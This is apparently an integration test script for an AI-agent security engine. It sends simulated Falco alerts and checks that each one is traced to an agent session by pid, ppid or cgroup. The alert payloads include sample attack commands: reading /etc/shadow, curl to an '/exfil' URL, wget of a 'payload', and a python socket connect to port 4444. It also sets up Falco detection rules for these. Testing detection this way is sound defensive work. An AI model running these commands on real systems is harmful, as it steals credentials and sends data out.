#!/usr/bin/env bash
# test-falco-cross-layer.sh
# Test Falco syscall alerts -> Engine three-level correlation (pid -> cgroup -> ppid) -> session risk scoring
#
# On macOS, Falco is not required; simulate Falco http_output JSON payload via curl,
# to verify FalcoAlertController's cross-layer correlation logic.
#
# Prerequisites:
#   1. scripts/run-local.sh started control(8080) + engine(8082) + redis(6379)
#   2. or start manually: redis-server + engine jar
#
set -euo pipefail

ENGINE="${VIRBIUS_ENGINE:-http://127.0.0.1:8082}"
CONTROL="${VIRBIUS_CONTROL:-http://127.0.0.1:8080}"
REDIS_PORT="${VIRBIUS_REDIS_PORT:-6379}"
TENANT="default"

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[0;33m'; NC='\033[0m'
info()  { echo -e "${CYAN}[INFO]${NC}  $*"; }
ok()    { echo -e "${GREEN}[OK]${NC}    $*"; }
warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }
err()   { echo -e "${RED}[ERROR]${NC} $*"; }

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN} Falco cross-layer correlation test (macOS simulation mode)   ${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

# ─── 0. Pre-flight checks ───
info "Checking service availability..."

if ! curl -sf "$ENGINE/admin/health" >/dev/null 2>&1; then
  err "Engine unreachable: $ENGINE"
  err "Run first: ./scripts/run-local.sh"
  exit 1
fi
ok "Engine reachable"

if ! redis-cli -p "$REDIS_PORT" ping 2>/dev/null | grep -q PONG; then
  err "Redis unreachable: port $REDIS_PORT"
  exit 1
fi
ok "Redis reachable"
echo ""

# ─── 1. Seed pidmap + cgroup data ───
info "Step 1: Seed pidmap + cgroup data (simulate Agent registration)"

# pidmap JSON value (primary index and cgroup reverse index share the same value)
PIDMAP_JSON='{"host_pid":12345,"ns_pid":42,"cgroup_id":777,"trace_id":"trace-001","session_id":"sess-test-001","app_id":"test-agent","tenant_id":"default"}'

# Primary index: pid_trace:{host_pid} - Agent main process host_pid=12345
redis-cli -p "$REDIS_PORT" SET "pid_trace:12345" "$PIDMAP_JSON" EX 3600 >/dev/null
ok "pid_trace:12345 -> session=sess-test-001 (Agent main process)"

# Reverse index: cgroup_trace:{cgroup_id} - cgroup_id=777
# Mirrors the cgroup reverse index written by pidmap.rs::redis_backup_async()
redis-cli -p "$REDIS_PORT" SET "cgroup_trace:777" "$PIDMAP_JSON" EX 3600 >/dev/null
ok "cgroup_trace:777 -> session=sess-test-001 (cgroup reverse index)"

# Scenario 2: child process host_pid=12346 not registered (simulate forked child absent from pidmap)
#       but ppid=12345 points to main process; Engine uses ppid fallback for correlation
info "Child pid=12346 not registered (testing ppid fallback)"

# Scenario 4: grandchild pid=12347, ppid=12346 both absent from pidmap (ppid chain broken)
#       but cgroup_id=777 is in the cgroup reverse index -> cgroup correlation
info "Grandchild pid=12347 not registered, ppid=12346 also absent from pidmap (testing cgroup correlation)"
echo ""

# ─── 2. Send simulated Falco alerts ───
info "Step 2: Send simulated Falco alerts"

echo ""
echo -e "${YELLOW}--- Scenario 1: Agent main process opens /etc/shadow (pid direct hit) ---${NC}"
echo "  Falco rule: sensitive_shadow_access"
echo "  proc.pid=12345 (Agent main process, in pidmap)"
echo "  proc.cgroup.id=777 (same cgroup)"
echo "  expected: resolved_by=pid"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "sensitive_shadow_access",
    "priority": "Critical",
    "output": "Sensitive file access (pid=12345, ppid=1, cgroup=777, file=/etc/shadow)",
    "output_fields": {
      "evt.time": 1704067200000000000,
      "proc.pid": 12345,
      "proc.ppid": 1,
      "proc.cgroup.id": 777,
      "proc.name": "cat",
      "proc.cmdline": "cat /etc/shadow",
      "proc.pcmdline": "/agent/virbius-core",
      "fd.name": "/etc/shadow",
      "user.name": "root"
    }
  }')

echo "  Engine response: $RESULT"
if echo "$RESULT" | grep -q '"sess-test-001"' && echo "$RESULT" | grep -q '"pid"'; then
  ok "Scenario 1 PASS: alert correlated to session=sess-test-001 (resolved_by=pid)"
else
  err "Scenario 1 FAIL: not correlated to session or resolved_by != pid"
fi
echo ""

echo -e "${YELLOW}--- Scenario 2: Agent forked child outbound connection (ppid fallback) ---${NC}"
echo "  Falco rule: agent_child_outbound"
echo "  proc.pid=12346 (child process, not in pidmap)"
echo "  proc.ppid=12345 (main process, in pidmap -> ppid fallback)"
echo "  proc.cgroup.id=0 (simulate legacy Falco without cgroup field, test ppid path)"
echo "  expected: resolved_by=ppid"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "agent_child_outbound",
    "priority": "Warning",
    "output": "Agent outbound (pid=12346, ppid=12345, sip=1.2.3.4)",
    "output_fields": {
      "evt.time": 1704067200000000001,
      "proc.pid": 12346,
      "proc.ppid": 12345,
      "proc.cgroup.id": 0,
      "proc.name": "curl",
      "proc.cmdline": "curl http://1.2.3.4/exfil",
      "proc.pcmdline": "/agent/virbius-core",
      "fd.sip": "1.2.3.4",
      "fd.sport": 80,
      "user.name": "root"
    }
  }')

echo "  Engine response: $RESULT"
if echo "$RESULT" | grep -q '"sess-test-001"' && echo "$RESULT" | grep -q '"ppid"'; then
  ok "Scenario 2 PASS: child correlated to session=sess-test-001 via ppid fallback (resolved_by=ppid)"
else
  err "Scenario 2 FAIL: ppid fallback not working or resolved_by != ppid"
fi
echo ""

echo -e "${YELLOW}--- Scenario 3: non-Agent process alert (should be filtered) ---${NC}"
echo "  Falco rule: sensitive_shadow_access"
echo "  proc.pid=99999 (non-Agent process, not in pidmap, ppid also absent)"
echo "  proc.cgroup.id=888 (non-Agent cgroup, not in cgroup_trace)"
echo "  expected: pid_not_mapped"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "sensitive_shadow_access",
    "priority": "Critical",
    "output": "Sensitive file access (pid=99999, ppid=1, cgroup=888, file=/etc/shadow)",
    "output_fields": {
      "proc.pid": 99999,
      "proc.ppid": 1,
      "proc.cgroup.id": 888,
      "proc.name": "cat",
      "fd.name": "/etc/shadow",
      "user.name": "root"
    }
  }')

echo "  Engine response: $RESULT"
if echo "$RESULT" | grep -q 'pid_not_mapped'; then
  ok "Scenario 3 PASS: non-Agent process filtered (pid/cgroup/ppid all miss)"
else
  err "Scenario 3 FAIL: non-Agent process not filtered"
fi
echo ""

echo -e "${YELLOW}--- Scenario 4: Agent grandchild outbound (cgroup correlation, ppid chain broken) ---${NC}"
echo "  Falco rule: agent_child_outbound"
echo "  proc.pid=12347 (grandchild, not in pidmap)"
echo "  proc.ppid=12346 (child, also not in pidmap -> ppid chain broken)"
echo "  proc.cgroup.id=777 (same cgroup as Agent -> cgroup hit)"
echo "  expected: resolved_by=cgroup"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "agent_child_outbound",
    "priority": "Warning",
    "output": "Agent grandchild outbound (pid=12347, ppid=12346, cgroup=777, sip=5.6.7.8)",
    "output_fields": {
      "evt.time": 1704067200000000002,
      "proc.pid": 12347,
      "proc.ppid": 12346,
      "proc.cgroup.id": 777,
      "proc.name": "wget",
      "proc.cmdline": "wget http://5.6.7.8/payload",
      "proc.pcmdline": "bash -c curl",
      "fd.sip": "5.6.7.8",
      "fd.sport": 443,
      "user.name": "root"
    }
  }')

echo "  Engine response: $RESULT"
if echo "$RESULT" | grep -q '"sess-test-001"' && echo "$RESULT" | grep -q '"cgroup"'; then
  ok "Scenario 4 PASS: grandchild correlated to session=sess-test-001 via cgroup (resolved_by=cgroup)"
else
  err "Scenario 4 FAIL: cgroup correlation not working or resolved_by != cgroup"
fi
echo ""

echo -e "${YELLOW}--- Scenario 5: after setsid detach ppid=1 but cgroup hit ---${NC}"
echo "  Falco rule: agent_child_outbound"
echo "  proc.pid=12348 (detached process, not in pidmap)"
echo "  proc.ppid=1 (after setsid ppid points to init, not in pidmap -> ppid useless)"
echo "  proc.cgroup.id=777 (same cgroup as Agent -> cgroup hit)"
echo "  expected: resolved_by=cgroup (ppid=1 filtered as init)"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "agent_child_outbound",
    "priority": "Warning",
    "output": "Agent detached outbound (pid=12348, ppid=1, cgroup=777, sip=9.10.11.12)",
    "output_fields": {
      "evt.time": 1704067200000000003,
      "proc.pid": 12348,
      "proc.ppid": 1,
      "proc.cgroup.id": 777,
      "proc.name": "python3",
      "proc.cmdline": "python3 -c import socket;socket.connect((9.10.11.12,4444))",
      "proc.pcmdline": "bash -c setsid",
      "fd.sip": "9.10.11.12",
      "fd.sport": 4444,
      "user.name": "root"
    }
  }')

echo "  Engine response: $RESULT"
if echo "$RESULT" | grep -q '"sess-test-001"' && echo "$RESULT" | grep -q '"cgroup"'; then
  ok "Scenario 5 PASS: after setsid detach correlated to session via cgroup (resolved_by=cgroup)"
else
  err "Scenario 5 FAIL: setsid scenario cgroup correlation not working"
fi
echo ""

# ─── 3. Verify risk scoring ───
info "Step 3: Verify risk scoring"
echo ""

FALCO_PENDING=$(redis-cli -p "$REDIS_PORT" GET "session:sess-test-001:falco_pending" 2>/dev/null || echo "0")
echo "  session:sess-test-001:falco_pending = $FALCO_PENDING"
echo "  (expected=4: scenarios 1+2+4+5 each INCR once, scenario 3 filtered out)"

if [[ "$FALCO_PENDING" == "4" ]]; then
  ok "Risk scoring PASS: falco_pending=4 (4 Agent alerts counted)"
else
  warn "falco_pending=$FALCO_PENDING (expected 4; Engine may not be connected to Redis or onFalcoAlert not executed)"
fi
echo ""

# ─── 4. Configure Falco rules via Control (verify delivery pipeline) ───
info "Step 4: Configure Falco rules via Control console"
echo ""

if ! curl -sf "$CONTROL/api/v1/health" >/dev/null 2>&1; then
  warn "Control unreachable, skipping rule delivery test"
  echo ""
  exit 0
fi

info "Configuring rule: sensitive_shadow_access"
curl -s -X POST "$CONTROL/api/v1/admin/tenants/$TENANT/rules" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule_id": "sensitive_shadow_access",
    "bundle_id": "poc-default",
    "layer": "falco",
    "runtime": "falco",
    "reason_code": "CRITICAL",
    "risk_score": 50,
    "intent_action": "allow",
    "scope": {"description": "Detect /etc/shadow access"},
    "body": {
      "condition": "evt.type in (open, openat, openat2) and fd.name=/etc/shadow",
      "output": "Sensitive file access (pid=%proc.pid, ppid=%proc.ppid, cgroup=%proc.cgroup.id, file=%fd.name, pcmdline=%proc.pcmdline)",
      "tags": "agent,filesystem,sensitive"
    }
  }' >/dev/null && ok "Rule sensitive_shadow_access saved" || warn "保存失败"

info "Configuring rule: agent_child_outbound"
curl -s -X POST "$CONTROL/api/v1/admin/tenants/$TENANT/rules" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule_id": "agent_child_outbound",
    "bundle_id": "poc-default",
    "layer": "falco",
    "runtime": "falco",
    "reason_code": "WARNING",
    "risk_score": 30,
    "intent_action": "allow",
    "scope": {"description": "Detect Agent child process outbound"},
    "body": {
      "condition": "evt.type=connect and not fd.sip in (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
      "output": "Agent outbound (pid=%proc.pid, ppid=%proc.ppid, cgroup=%proc.cgroup.id, sip=%fd.sip, pcmdline=%proc.pcmdline)",
      "tags": "agent,network,child_process"
    }
  }' >/dev/null && ok "Rule agent_child_outbound saved" || warn "保存失败"

info "Publishing snapshot (triggers config_subscriber hot reload)"
curl -s -X POST "$CONTROL/api/v1/admin/tenants/$TENANT/rules/_/runtime/publish-snapshot" \
  -H 'Content-Type: application/json' >/dev/null && ok "Snapshot published" || warn "发布失败"

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN} Test complete                                 ${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo "Verification items:"
echo "  1. Falco JSON -> Engine FalcoAlertController parsing"
echo "  2. proc.pid -> Redis pidmap lookup -> session_id (resolved_by=pid)"
echo "  3. ppid fallback (direct child correlation, resolved_by=ppid)"
echo "  4. cgroup correlation (grandchild, ppid chain broken, resolved_by=cgroup)"
echo "  5. cgroup correlation (setsid detach, ppid=1, resolved_by=cgroup)"
echo "  6. non-Agent process filtering (pid/cgroup/ppid all miss)"
echo "  7. risk scoring pending count (4 Agent alerts)"
echo "  8. Control console rule config + delivery (incl. proc.cgroup.id field)"
echo ""
echo "View Engine logs:"
echo "  tail -50 /tmp/virbius-agent/logs/engine.log"
echo ""
echo "To test real Falco (requires Docker):"
echo "  brew install --cask docker"
  echo "  # After starting Docker Desktop, run:"
echo "  docker run --rm -d --name falco --privileged \\"
echo "    -v /dev:/dev -v /proc:/host/proc:ro \\"
echo "    -e FALCO_HTTP_OUTPUT_URL=http://host.docker.internal:8082/api/internal/falco-alert \\"
echo "    falcosecurity/falco:0.39.0 --modern"
echo ""
